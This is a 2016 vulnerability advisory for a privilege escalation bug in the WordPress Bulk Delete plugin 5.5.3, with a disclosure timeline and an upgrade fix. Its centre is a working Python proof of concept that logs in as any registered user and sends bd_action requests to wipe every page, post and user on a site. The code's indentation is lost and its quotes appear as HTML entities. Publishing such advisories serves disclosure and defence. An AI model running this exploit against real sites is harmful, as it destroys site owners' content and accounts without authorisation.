* Exploit Title: WordPress Bulk Delete Plugin [Privilege Escalation]
* Discovery Date: 2016-02-10
* Exploit Author: Panagiotis Vagenas
* Author Link: https://twitter.com/panVagenas
* Vendor Homepage: http://bulkwp.com/
* Version: 5.5.3
* Tested on: WordPress 4.4.2
* Category: WebApps, WordPress
 
 
Description
-----------
 
_Bulk Delete_ plugin for WordPress suffers from a privilege escalation
vulnerability. Any registered user can exploit the lack of capabilities
checks to perform all administrative tasks provided by the _Bulk Delete_
plugin. Some of these actions, but not all, are:
 
- `bd_delete_pages_by_status`: deletes all pages by status
- `bd_delete_posts_by_post_type`: deletes all posts by type
- `bd_delete_users_by_meta`: delete all users with a specific pair of
meta name, meta value
 
Nearly all actions registered by this plugin can be performed from any
user, as long as they passed to a query var named `bd_action` and the
user has a valid account. These actions would normally require
administrative wrights, so we can consider this as a privilege
escalation vulnerability.
 
PoC
---
 
The following script will delete all pages, posts and users from the
infected website.
&#039;&#039;&#039;
 
#!/usr/bin/python3
 
################################################################################
# Bulk Delete Privilege Escalation Exploit
#
# **IMPORTANT** Don&#039;t use this in a production site, if vulnerable it will
# delete nearly all your sites content
#
# Author: Panagiotis Vagenas <pan.vagenas@gmail.com>
################################################################################
 
import requests
 
loginUrl = &#039;http://example.com/wp-login.php&#039;
adminUrl = &#039;http://example.com/wp-admin/index.php&#039;
 
loginPostData = {
&#039;log&#039;: &#039;username&#039;,
&#039;pwd&#039;: &#039;password&#039;,
&#039;rememberme&#039;: &#039;forever&#039;,
&#039;wp-submit&#039;: &#039;Log+In&#039;
}
 
l = requests.post(loginUrl, data=loginPostData)
 
if l.status_code != 200 or len(l.history) == 0 or
len(l.history[0].cookies) == 0:
print("Couldn&#039;t acquire a valid session")
exit(1)
 
loggedInCookies = l.history[0].cookies
 
def do_action(action, data):
try:
requests.post(
adminUrl + &#039;?bd_action=&#039; + action,
data=data,
cookies=loggedInCookies,
timeout=30
)
except TimeoutError:
print(&#039;Action &#039; + action + &#039; timed out&#039;)
else:
print(&#039;Action &#039; + action + &#039; performed&#039;)
 
print(&#039;Deleting all pages&#039;)
do_action(
&#039;delete_pages_by_status&#039;,
{
&#039;smbd_pages_force_delete&#039;: &#039;true&#039;,
&#039;smbd_published_pages&#039;: &#039;published_pages&#039;,
&#039;smbd_draft_pages&#039;: &#039;draft_pages&#039;,
&#039;smbd_pending_pages&#039;: &#039;pending_pages&#039;,
&#039;smbd_future_pages&#039;: &#039;future_pages&#039;,
&#039;smbd_private_pages&#039;: &#039;private_pages&#039;,
}
)
 
print(&#039;Deleting all posts from all default post types&#039;)
do_action(&#039;delete_posts_by_post_type&#039;, {&#039;smbd_types[]&#039;: [
&#039;post&#039;,
&#039;page&#039;,
&#039;attachment&#039;,
&#039;revision&#039;,
&#039;nav_menu_item&#039;
]})
 
print(&#039;Deleting all users&#039;)
do_action(
&#039;delete_users_by_meta&#039;,
{
&#039;smbd_u_meta_key&#039;: &#039;nickname&#039;,
&#039;smbd_u_meta_compare&#039;: &#039;LIKE&#039;,
&#039;smbd_u_meta_value&#039;: &#039;&#039;,
}
)
 
exit(0)
 
 
&#039;&#039;&#039;
Solution
--------
 
Upgrade to v5.5.4
 
Timeline
--------
 
1. **2016-02-10**: Requested CVE ID
3. **2016-02-10**: Vendor notified through the contact form at bulkwp.com
4. **2016-02-10**: Vendor responded and received details about the issue
5. **2016-02-10**: Vendor verified vulnerability
6. **2016-02-13**: Vendor released v5.5.4 which resolves this issue
&#039;&#039;&#039;

